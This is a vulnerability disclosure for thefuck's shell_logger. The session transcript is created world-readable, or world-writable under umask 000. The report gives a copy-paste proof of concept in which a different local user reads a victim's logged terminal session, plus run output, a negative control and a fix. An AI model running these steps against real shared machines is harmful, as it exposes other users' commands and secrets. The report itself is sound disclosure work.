# thefuck shell_logger creates the full session transcript world-readable (0755, or 0777 under permissive umask)

**Upstream issue:** https://github.com/nvbn/thefuck/issues/1621

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04; output below is from the actual run, including a cross-user read as uid 65534 and a negative control)

## Reproduction conditions

- thefuck 3.32, Python 3.12.3, Ubuntu 24.04 (WSL2), source (editable) install in a venv
- A shared multi-user host: the victim starts a logged session (`thefuck -l <log>`); any other local uid then reads (or, under permissive umask, writes) the transcript. Default umask 022 assumed for the primary case.

## Description

`shell_logger` (`thefuck/entrypoints/shell_logger.py:74-76`) creates the session transcript log with **no mode argument**:

```python
fd = os.open(output, os.O_CREAT | os.O_TRUNC | os.O_RDWR)   # mode defaults to 0o777 & ~umask
os.write(fd, b'\x00' * const.LOG_SIZE_IN_BYTES)
buffer = mmap.mmap(fd, const.LOG_SIZE_IN_BYTES, mmap.MAP_SHARED, mmap.PROT_WRITE)
```

Under the default umask 022 this produces a **0755** log file (even the execute bit leaks in); under umask 000 it is fully **0777**. The log is the 1 MiB mmap buffer into which the whole pty session stream — everything typed and echoed during the session, including instant-mode sessions started via the generated shell alias — is written for the lifetime of the session. There is no `chmod`, `0o600`, `mkdtemp`, or `O_EXCL` anywhere in the path.

## Impact

On a shared multi-user machine, any local user can read another user's full session transcript (commands, outputs, secrets echoed to the terminal) while it is being written — confirmed below by an actual read as uid 65534. Under umask 000 the same file is world-**writable**, which additionally enables the log-poisoning chain reported separately in #1622 (steering the corrected command that the victim's shell will execute).

## PoC (copy-paste ready)

**Step 1 — victim starts a logged session and types a command containing a secret:**

```bash
# terminal 1 (victim) — thefuck -l needs a real tty, hence the script(1) wrapper here
umask 022
{ sleep 2; printf 'echo SECRET-TOKEN-1621\r'; sleep 1; printf 'exit\r'; sleep 2; } \
  | script -qec "thefuck -l /tmp/session.log" /dev/null
stat -c "%a %s" /tmp/session.log     # -> 755 1048576
grep -a SECRET-TOKEN-1621 /tmp/session.log   # the secret is in the transcript
```

**Step 2 — any other local user reads it (here: root drops to uid 65534 `nobody`):**

```bash
setpriv --reuid=65534 --regid=65534 --clear-groups head -c 32 /tmp/session.log; echo "rc=$?"
```

**Negative control (proves the read test is real DAC enforcement, not vacuous):**

```bash
install -m 600 /tmp/session.log /tmp/ctl.log
setpriv --reuid=65534 --regid=65534 --clear-groups head -c 32 /tmp/ctl.log; echo "rc=$?"   # -> denied
```

## Execution result (actual run: thefuck 3.32 / Python 3.12.3 / Ubuntu 24.04)

Victim side:

```
=== Step 1: logged session under umask 022 (a secret is echoed inside the session) ===
session rc=0
umask 022 -> mode=755 (-rwxr-xr-x) size=1048576 owner=iot

=== Step 2: logged session under umask 000 ===
session rc=0
umask 000 -> mode=777 (-rwxrwxrwx) size=1048576 owner=iot

=== Step 3: the secret really is inside the transcript ===
SECRET-TOKEN-1621 found in /tmp/tf1621_022.log
```

Attacker side (separate root session, dropped to uid 65534 `nobody`):

```
uid=0(root) gid=0(root) groups=0(root)
read umask-022 transcript as nobody: rc=0 -> ANY local user can read the session transcript
write umask-000 transcript as nobody: rc=0 -> ANY local user can poison the session log
--- negative control: same read on a 0600 copy is denied ---
control: denied -> proves the DAC test is real
```

## Suggested fix

Pass an explicit private mode: `os.open(output, os.O_CREAT | os.O_TRUNC | os.O_RDWR, 0o600)`.
